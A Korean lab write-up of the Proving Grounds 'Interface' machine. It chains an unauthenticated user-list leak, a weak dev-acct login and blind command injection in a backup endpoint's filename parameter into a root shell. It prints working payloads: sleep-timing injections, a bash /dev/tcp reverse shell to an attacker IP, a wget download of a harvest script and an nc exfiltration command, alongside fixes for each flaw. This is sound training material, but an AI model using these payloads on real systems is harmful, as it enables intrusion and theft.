---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/access-control-bypass
  - tech/web/cmd-injection
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.103.106
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 3
---

> [!info] 요약
> **Interface** · Proving Grounds Fundamental · Linux(Debian 10, Node.js/Express 웹앱)(`192.168.103.106`) · 플래그 1개 — 단일 플래그 박스. `/root/proof.txt` 외 `local.txt`·`user.txt`·`flag.txt` 부재를 `find /` 전수 탐색으로 확인
> 진입점: 무인증 `/api/users` 계정 열거 → `dev-acct:password` 로그인 → `/api/backup?filename=` 블라인드 OS 커맨드 인젝션 → tcp/443 리버스셸
> 권한상승: 해당 없음 — Express 애플리케이션이 root 권한으로 구동돼 초기 접근 즉시 root
> `proof.txt` = `85c93a17e808db8cab1dbc6b49c5256e`(root) · `local.txt` 없음 — 단일 플래그 박스
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.103.106

### Initial Access – 무인증 /api/users 계정 열거 → dev-acct 로그인 → /api/backup 블라인드 커맨드 인젝션으로 원격 코드 실행

**Vulnerability Explanation:**
- 정적 경로 프로빙 26종과 gobuster 가 전부 무소득 — 26종 전량 `404` 이고 본문은 Express 기본 오류 페이지(`Cannot GET /<경로>`, 143~154바이트). 디렉터리 열거로는 API 표면 확인 불가(`probe-interesting.txt` 0바이트가 그 기록)
- Angular 번들(`main.js`)을 grep 해 API 표면 확보 — `/login` · `/api/users` · `/api/settings` · `/api/backup?filename=` 4개 엔드포인트 노출
- `/api/users` 에만 인증 미들웨어 부재 — 무인증 GET 요청으로 계정명 2,001개(고유 1,922개)가 담긴 JSON(17,631바이트) 노출. 전량이 영문자만으로 이뤄진 사람 이름인데 `dev-acct` 하나만 하이픈을 포함 — 유일한 비알파벳 항목이라 표적으로 특정
- `/api/backup` 의 `filename` 파라미터가 검증 없이 셸 명령에 그대로 삽입돼 명령 치환 문법(`$()` · 백틱)이 그대로 실행 — 블라인드 OS 커맨드 인젝션

**Vulnerability Fix:**
- `/api/users` 에도 다른 `/api/*` 엔드포인트와 동일한 인증 미들웨어 적용
- `dev-acct:password` 처럼 예측 가능한 계정명·사전 단어 조합의 자격증명 정책 폐기
- `filename` 파라미터를 셸 문자열에 직접 삽입하지 말고 화이트리스트 검증 또는 인자 배열 기반 실행(`execFile`)으로 전환

**Severity:** Critical — 인증 없이 시작한 열거가 임의 명령 실행으로 직결

**Steps to reproduce the attack:**
1. `Service Enumeration` 절의 번들 분석으로 API 표면 확보
2. `GET /api/users` 무인증 요청으로 계정 목록 열거, `dev-acct` 특정
3. `POST /login` 배치 자격증명 시도로 `dev-acct:password` 로그인 성공, 세션 쿠키 확보
4. `GET /api/backup?filename=` 에 시간 지연 페이로드로 블라인드 인젝션 확인
5. `filename` 파라미터에 리버스셸 페이로드를 실어 콜백 수신 — 즉시 root

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.103.106 | TCP: 22, 80 |

```bash
ssh kali@10.44.44.128 "nmap --privileged -Pn -n -sCV -p 22,80 -oN nmap-quick.txt 192.168.103.106"
```

```text
# Nmap 7.98 scan initiated Wed Sep  9 10:39:46 2026 as: /usr/lib/nmap/nmap --privileged -Pn -n -sCV -p 22,80 -oN /home/kali/PG/Interface/nmap-quick.txt 192.168.103.106
Nmap scan report for 192.168.103.106
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 08:50:f6:e6:aa:44:d6:c4:f1:ca:3c:d1:d9:18:43:4d (RSA)
|   256 ed:c6:e6:95:88:99:58:31:14:20:38:83:01:e2:e7:15 (ECDSA)
|_  256 ba:65:96:08:a2:e2:f5:1f:af:88:6e:55:c7:9c:5f:b1 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: App
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  9 10:39:55 2026 -- 1 IP address (1 host up) scanned in 9.64 seconds
```
— 출처: `~/PG/Interface/nmap-quick.txt`

전체 포트(`-p-`) 재확인에서도 22·80 두 개뿐 — 공격면은 웹 하나:

```text
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Node.js Express framework
|_http-title: App
```
— 출처: `~/PG/Interface/nmap-full.txt`(발췌)

- **UDP top-100** — 16개 closed · 84개 무응답(`open|filtered`). 실용 벡터 부재. 출처: `~/PG/Interface/nmap-udp-top100.txt`
- **SNMP** — 커뮤니티 스트링 5종(`public`·`private`·`community`·`manager`·`admin`) 발사, 응답 0건
- **SNMP 출처** — `~/PG/Interface/svc/snmp-onesixtyone.txt`(스캔 개시 줄만 남고 히트 없음) · 스트링 목록은 `~/PG/Interface/svc/snmp-communities.txt`

버전·역할 판정 근거:
- `X-Powered-By: Express` 응답 헤더와 nmap 서비스 배너("Node.js Express framework")가 독립적으로 일치 — Node.js/Express 백엔드 확정
- SSH 배너(`SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2`)와 nmap 판정 일치 — Debian 10 확정. 22 는 실용 원격 벡터 없어 배제

루트 페이지는 Angular SPA(`index.html` 703바이트, `<app-root>`, title "App"). 정적 경로 프로빙 26종(`robots.txt`·`.env`·`.git/HEAD`·`package.json`·`wp-login.php`·`phpinfo.php` 등)은 **전량 404**:

```text
404 149  /robots.txt  -> probe_robots.txt
404 143  /.env  -> probe_.env
404 148  /.git/HEAD  -> probe_.git_HEAD
404 151  /package.json  -> probe_package.json
404 150  /phpinfo.php  -> probe_phpinfo.php
404 145  /admin/  -> probe_admin_
```
— 출처: `~/PG/Interface/web-80/probe-index.txt`(26행 중 발췌). 응답 본문은 전부 Express 기본 오류 페이지 `<pre>Cannot GET /<경로></pre>`

```text
/index.html           (Status: 200) [Size: 703]
/.                    (Status: 301) [Size: 169] [--> /./]
```
— 출처: `~/PG/Interface/gobuster-80.txt`

- **gobuster 결과** — `/index.html` 하나뿐. 미지 경로에 SPA fallback 없이 404 반환
- **그래서** — dist 디렉터리 정적 서빙만 존재. history fallback 미들웨어 부재
- **디렉터리 브루트가 헛돈 이유** — 노출된 정적 경로가 번들 파일 몇 개뿐인 데다 실제 공격면 `/api/*` 가 일반 워드리스트에 부재

![[PG-Interface-로그인화면.png]]
*그림 1 — 진입점 로그인 화면(Username/Password/Submit, Light/Dark 토글, "Top Users" 영역). 헤드리스 크로미움 캡처(`shot_80_root.png`)를 볼트로 회수 — 이 박스의 유일한 라이브 캡처*

디렉터리 브루트 대신 Angular 번들(`main.js`, 47KB)을 grep 해 API 표면 확보:

```bash
ssh kali@10.44.44.128 'grep -o "http\.\(post\|get\)([^)]\{0,120\}" ~/PG/Interface/js/main.js'
```

```text
http.get('/api/settings', { withCredentials: true }
http.post('/api/settings', { 'color-theme': theme }, { withCredentials: true, responseType: 'text' }
http.get('/api/settings', { withCredentials: true }
http.get(`/api/backup?filename=${f.value.filename}`, { withCredentials: true, responseType: 'text' }
http.get('/api/settings', { withCredentials: true }
http.post('/login', { username: f.value.username, password: f.value.password }, { withCredentials: true, responseType: 'text' }
http.get('/api/users', { withCredentials: true }
```
— 출처: `~/PG/Interface/js/main.js`

`filename` 값이 서버로 그대로 전달된다는 사실을 백엔드 소스 없이 이 시점에 이미 확인 — 이 박스의 실제 분기점은 gobuster 가 아니라 번들 코드.

무인증으로 세 엔드포인트를 직접 확인:

```text
### /api/users
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 17631
ETag: W/"44df-3pGZzqnIntL3kmGG7DeM+P6TYuQ"
Date: Wed, 09 Sep 2026 01:41:56 GMT
Connection: keep-alive

["lionel","trudy","hugo","reba","shelton", … ,"luz","deidre","dev-acct","george","irvin", … ,"marquis","rosie","tessa"]

### /api/settings
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: text/plain; charset=utf-8
Content-Length: 12
ETag: W/"c-dAuDFQrdjS3hezqxDTNgW7AOlYk"
Date: Wed, 09 Sep 2026 01:41:56 GMT
Connection: keep-alive

### /api/backup?filename=test
HTTP/1.1 401 Unauthorized
```
— 출처: `~/PG/Interface/api/probe1.txt`. 두 곳을 줄임 — ①JSON 배열은 원문 한 줄 2,001개 중 앞 5개·`dev-acct` 전후 2개·끝 3개만 남기고 `…` 로 생략 ②401 두 건의 본문(`Unauthorized`)과 `/api/backup` 쪽 헤더 생략. 원문 전량은 산출물에 보존

`/api/users` 만 인증 부재 — 나머지 둘은 401. 응답 JSON 은 2,001개(고유 1,922개) 이름 배열이고, 인덱스 237 의 `dev-acct` 가 **유일한 비알파벳 항목** — 나머지 2,000개는 전부 영문자만으로 된 사람 이름. 표적 선정에 추측 불필요.

### Initial Access – dev-acct 로그인 후 /api/backup 타이밍 기반 블라인드 인젝션

<이 경로의 일반 절차(SPA 앞 gobuster 무의미·타이밍 기반 블라인드 판정)는 [[_PLAYBOOK]] 참조. 이 절은 이 박스의 실제 재현>

`dev-acct` 계정을 특정한 뒤, admin·dev-acct 두 계정에 4개 후보 비밀번호를 배치로 발사해 유효 자격증명 확인:

```text
## admin:admin
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Date: Wed, 09 Sep 2026 01:42:07 GMT
Connection: keep-alive
Content-Length: 12

Unauthorized
## dev-acct:password
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/plain; charset=utf-8
Content-Length: 2
ETag: W/"2-nOO9QiTIwXgNtWtBJezz8kv3SLc"
Set-Cookie: connect.sid=s%3AJL7UM_vkm6Off6Wi4svB4zYqb64QUaJx.%2BAQOffrBL3TJDlnBd9OL2dlC3WX1apq3BAki1FKqq1c; Path=/; HttpOnly
Date: Wed, 09 Sep 2026 01:42:08 GMT
Connection: keep-alive

OK
## dev-acct:dev-acct
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Date: Wed, 09 Sep 2026 01:42:08 GMT
Connection: keep-alive
Content-Length: 12

Unauthorized
```
— 출처: `~/PG/Interface/api/login-probe.txt`(8쌍 중 발췌)

`dev-acct:password` 만 200 과 `Set-Cookie: connect.sid=…` 를 반환. 8쌍 배치 발사의 실소요는 응답 `Date` 헤더 기준 `01:42:07`~`01:42:08` UTC — 2초 이내 완료.

인증 후 `/api/backup?filename=` 에 메타문자 12종을 배치 발사. 응답이 두 갈래로 분기:

```text
PAYLOAD: test;id
Internal Server Error

PAYLOAD: test`id`
Created backup: /var/log/app/logfile-test`id`.gz

PAYLOAD: test$(id)
Created backup: /var/log/app/logfile-test$(id).gz

PAYLOAD: test|id
Internal Server Error

PAYLOAD: test&&id
Internal Server Error
```
— 출처: `~/PG/Interface/inj/try_1.txt`~`try_5.txt`(발췌)

- **응답 분기** — `;`·`|`·`&&` 는 500, 백틱·`$()` 는 "Created backup" 200 을 반환
- **판정 한계** — 어느 쪽 응답에도 `id` 출력 부재. 블라인드 상태라 응답 문자열만으로는 명령 실행 여부 판정 불가
- **판별 방법** — 응답 코드가 아니라 대조군을 포함한 시간차로 판별할 것

```text
[test$(sleep 6)] 6294ms :: Created backup: /var/log/app/logfile-test$(sleep 6).gz
[test`sleep 6`] 6283ms :: Created backup: /var/log/app/logfile-test`sleep 6`.gz
[test$IFS] 272ms :: Created backup: /var/log/app/logfile-test$IFS.gz
```
— 출처: `~/PG/Interface/inj/timing.txt`

`$(sleep 6)` · `` `sleep 6` `` 두 페이로드가 6.28~6.29초를 소모하고 대조군(`$IFS`, 명령 치환 없음)은 0.27초 — 6초 지연 재현으로 명령 치환의 실제 실행 확인. 블라인드 OS 커맨드 인젝션 확정.

**수동 대안** — 해당 없음. 전 구간 `curl` 수동 발사이고 자동 익스플로잇 도구 미사용. `sqlmap` 계열은 OSCP 시험 금지 도구라 이 경로에는 애초 선택지 부재.

리버스셸 페이로드를 같은 파라미터에 실어 443 으로 콜백:

```text
t$(bash -c "bash -i >& /dev/tcp/192.168.45.247/443 0>&1")
```
— 출처: `~/PG/Interface/payload_revsh.txt`. Kali 쪽 리스너: `nc -lvnp 443`(tmux)

```text
listening on [any] 443 ...
connect to [192.168.45.247] from (UNKNOWN) [192.168.103.106] 54180
bash: cannot set terminal process group (416): Inappropriate ioctl for device
bash: no job control in this shell
root@interface:/var/www/app/dist# < -la /root /home; which curl wget python3 nc python
uid=0(root) gid=0(root) groups=0(root)
interface
/home:
total 12
drwxr-xr-x  3 root   root   4096 Sep 30  2020 .
drwxr-xr-x 18 root   root   4096 Sep 30  2020 ..
drwxr-xr-x  2 justin justin 4096 Sep 30  2020 justin

/root:
total 20
drwx------  2 root root 4096 Sep  8 20:37 .
drwxr-xr-x 18 root root 4096 Sep 30  2020 ..
-rw-------  1 root root    0 Oct 14  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Sep  8 20:37 proof.txt
/usr/bin/wget
/usr/bin/python3
/usr/bin/nc
/usr/bin/python
root@interface:/var/www/app/dist#
```
— 출처: `~/PG/Interface/nc443.log`(발췌, 타겟 pty 프롬프트 `root@interface:/var/www/app/dist#` 그대로 보존)

- **`<` 와 CR 의 정체** — 프롬프트와 `<` 사이의 CR(`\r`)과 `<` 자체는 pty 가 긴 명령줄을 다시 그리면서 남긴 잔여. 화면에 남은 것은 명령의 «꼬리»뿐
- **원 명령** — 머리 부분 원문 미보존. 남은 출력 순서는 `uid=…` → `interface` → `ls` 결과

443 으로 한 번에 콜백 성공 — 80·53 폴백 불필요. 이 박스는 443 아웃바운드가 열려 있다는 것까지가 실측이고, 다른 포트의 개폐는 관측 없음.

콜백 즉시 `root@interface:/var/www/app/dist#` 프롬프트 — Express 애플리케이션이 root 로 구동돼 권한상승 단계 없이 곧바로 root.

- **스크린샷 미확보** — 인증 후 대시보드·백업 폼 화면. 리버스셸 획득 직후 포트 80 이 filtered 로 전환돼 재접속·재촬영 불가
- **재확인 스캔**(10:47:43~10:48:01) — `22/tcp open` · `80/tcp filtered http`. 출처: `~/PG/Interface/nmap-full-20260909-104738.txt`
- **filtered 의 판정 내용** — nmap 분류가 `closed`(RST 수신)가 아니라 `filtered`. RST 미수신
- **전환 원인** — 대상 재확인 불가로 관측 없음

**Local.txt value:**

없음 — 이 박스는 단일 플래그(`/root/proof.txt`)만 존재. `find /` 전수 탐색으로 `local.txt`·`user.txt`·`flag.txt` 부재 확인:

```text
===PROOF===
root
uid=0(root) gid=0(root) groups=0(root)
interface
192.168.103.106
Tue 08 Sep 2026 08:45:09 PM CDT
85c93a17e808db8cab1dbc6b49c5256e
===FLAGSEARCH===
== /root/proof.txt
85c93a17e808db8cab1dbc6b49c5256e
total 20
drwxr-xr-x 2 justin justin 4096 Sep 30  2020 .
drwxr-xr-x 3 root   root   4096 Sep 30  2020 ..
-rw-r--r-- 1 justin justin  220 Sep 30  2020 .bash_logout
-rw-r--r-- 1 justin justin 3526 Sep 30  2020 .bashrc
-rw-r--r-- 1 justin justin  807 Sep 30  2020 .profile
===END===
```
— 출처: `~/PG/Interface/pane_dump_1.txt`. 앞의 프롬프트·명령 에코 5줄 생략, `===PROOF===` 부터 인용

생략된 명령 에코의 원문 — 출처: `~/PG/Interface/pane_dump_1.txt`

```bash
echo ===PROOF===; whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ===FLAGSEARCH===; find / \( -name proof.txt -o -name local.txt -o -name flag.txt -o -name user.txt \) 2>/dev/null -exec sh -c "echo == {}; cat {}" \; ; ls -la /home/justin; echo ===END===
```

`/home/justin` 은 `.bashrc`·`.profile`·`.bash_logout` 뿐인 빈 홈 디렉터리 — 별도 유저 플래그를 둘 자리 자체가 부재. 포털 진행도 1/1 완료 처리 역시 단일 플래그 판정의 근거 — 슬롯이 애초 하나.

### Privilege Escalation – 해당 없음, Express 애플리케이션이 root 로 구동

**Vulnerability Explanation:**
- 권한상승 단계 부재 — 웹 애플리케이션(Node.js/Express) 프로세스 자체가 root 로 실행되고 있어, 초기 접근에서 얻은 명령 실행이 이미 root 권한
- `nc443.log` 콜백 직후 첫 명령의 `id` 출력이 `uid=0(root) gid=0(root) groups=0(root)` — 별도 권한상승 시도 없이 확인

**Vulnerability Fix:**
- 웹 애플리케이션을 전용 저권한 서비스 계정으로 구동(`systemd` 유닛의 `User=`/`Group=` 지정 또는 `su`/`setpriv` 로 드롭)
- 포트 80 바인딩에 root 가 필요하다면 `setcap cap_net_bind_service` 로 권한을 좁히거나 리버스 프록시(nginx 등) 뒤에 저권한으로 배치

**Severity:** Critical — 웹 애플리케이션의 임의 명령 실행 취약점 하나가 곧바로 시스템 전체 장악으로 직결

**Steps to reproduce the attack:**
1. `Initial Access – dev-acct 로그인 후 /api/backup 타이밍 기반 블라인드 인젝션` 절의 리버스셸 콜백을 그대로 수신
2. 콜백된 셸에서 `id` 확인 — 추가 조작 없이 `uid=0(root)`

콜백 셸에서의 즉시 확인:

```text
root@interface:/var/www/app/dist# < -la /root /home; which curl wget python3 nc python
uid=0(root) gid=0(root) groups=0(root)
interface
```
— 출처: `~/PG/Interface/nc443.log`(앞 절과 같은 블록. `<` 는 pty 재출력 잔여)

`getcap`·`sudo -l`·SUID 탐색 등 통상 권한상승 열거는 시도 자체가 불필요.

**수동 대안** — 해당 없음(권한상승 단계 자체가 부재).

### Post-Exploitation

콜백된 대화형 셸(`nc443.log`)에서 `whoami`·`id`·`hostname`·`hostname -I`·`date`·`cat /root/proof.txt` 를 한 명령으로 묶어 원위치 실행:

```text
root@interface:/var/www/app/dist# echo ====PROOF_ROOT====; whoami; id; hostname;
 hostname -I; date; cat /root/proof.txt; echo ====END====
<ame -I; date; cat /root/proof.txt; echo ====END====
====PROOF_ROOT====
root
uid=0(root) gid=0(root) groups=0(root)
interface
192.168.103.106
Tue 08 Sep 2026 08:45:37 PM CDT
85c93a17e808db8cab1dbc6b49c5256e
====END====
root@interface:/var/www/app/dist#
```
— 출처: `~/PG/Interface/proof_root.txt`(앞부분의 `-rw-r--r-- 1 justin justin 807 … .profile` · `===END===` 두 줄 생략 — 직전 flagsearch 명령의 tmux 스크롤백 잔여, 이 명령과 무관)

이 한 화면에 플래그 값·타깃 IP(`192.168.103.106`)·`id` 의 `uid=0(root)` 세 요소가 공존.

**Proof.txt value:**
`85c93a17e808db8cab1dbc6b49c5256e`

- 획득 권한 — `root`
- 채점 3요건은 「한 화면 스크린샷」이 요건이나 그림 증적 미확보 — 세션 캡처가 tmux 텍스트 덤프뿐
- 대체 증적 — 타겟 pty 프롬프트(`root@interface:/var/www/app/dist#`)와 `whoami`/`id`/`hostname -I`/`date`/`cat` 한 화면 텍스트
- 웹셸 아닌 **대화형 리버스셸에서 원위치 `cat`** — 근거는 `nc443.log` 의 pty 프롬프트와 「job control 없음」 배너. 웹 응답으로 플래그를 읽은 흔적 부재

harvest.sh 를 wget 으로 내려받아 실행했으나 회수는 실패:

```text
192.168.103.106 - - [09/Sep/2026 10:46:05] "GET /harvest.sh HTTP/1.1" 200 -
```
— 출처: `~/PG/Interface/http80.log`(Kali 측 파일 서버 접근 로그)

```text
수집 완료: /tmp/.h/harvest.txt
779 /tmp/.h/harvest.txt
```
— 출처: `~/PG/Interface/harvest_root.txt`(타겟 셸에서 harvest.sh 실행 직후 출력)

타겟에서 `/tmp/.h/harvest.txt`(779행) 생성까지는 확인됐으나, Kali 로 되받는 명령이 `/tmp/h.txt`(별도의 2행짜리 파일)를 잘못 지정해 본문 회수 실패:

```text
root@interface:/var/www/app/dist# <tmp/h.txt; nc -w 3 192.168.45.247 9001 < /tmp/h.txt
2 /tmp/h.txt
root@interface:/var/www/app/dist#
```
— 출처: `~/PG/Interface/nc443.log`

이후 포트 80 사망과 SSH 자격증명 15쌍(justin·dev-acct·root × 5개 비번) 전부 실패로 재진입 차단 — `/tmp/.h/harvest.txt` 본문 영구 유실, 내용은 관측 없음.

```text
justin:password => ... Permission denied, please try again.
dev-acct:password => ... Permission denied, please try again.
root:toor => ... Permission denied, please try again.
```
— 출처: `~/PG/Interface/ssh-cred-attempts.txt`(15쌍 중 3쌍 발췌. 각 행 중간의 known_hosts·PQ 알고리즘 경고 문구는 `...` 로 생략)

**남긴 흔적** — 되돌리지 않은 변경. 랩이라 인스턴스 정지로 사라졌으나 실 평가라면 보고서에 기재해야 할 항목

| 종류 | 대상 | 내용 | 복구 여부 |
|---|---|---|---|
| 업로드 파일 | 타겟 `harvest.sh`(저장 경로 관측 없음) | Kali 파일 서버에서 `wget` 으로 내려받은 열거 스크립트 | 인스턴스 정지로 소멸 |
| 생성 파일 | 타겟 `/tmp/.h/harvest.txt`(779행) · `/tmp/h.txt`(2행) | `harvest.sh` 실행 산출물 | 인스턴스 정지로 소멸 |
| 백업 파일 | `/var/log/app/logfile-*.gz` | 「Created backup」 응답이 실측된 12건(인젝션 12종 중 9종 + 타이밍 3종). 500 을 받은 `;`·`\|`·`&&` 3종과 리버스셸 페이로드의 파일 생성 여부는 관측 없음 | 인스턴스 정지로 소멸 |
| 계정·설정 | 없음 | 계정 추가·비밀번호 변경·설정 변경 부재 | 해당 없음 |

- 공격 호스트 쪽 산출물 — 세션 쿠키(`~/PG/Interface/api/cj.txt`) 잔존, 인스턴스 정지로 무효
- 이 세션의 LHOST — `192.168.45.247`(VPN 재접속마다 변동)

## 관련

- 산출물 — `~/PG/Interface/writeup_notes.txt`(시행착오 원본) · `~/PG/Interface/nc443.log`(리버스셸 세션 원문) · `~/PG/Interface/js/main.js`(API 표면이 드러난 번들)
- 원문 미보존 항목 — 타겟 `/tmp/.h/harvest.txt`(779행, exfil 실패로 유실) · 인증 후 대시보드·백업 폼 화면(포트 80 사망으로 재촬영 불가)
- [[_PLAYBOOK]] — 시행착오·시험 관점·기법 카드의 유일한 소재지
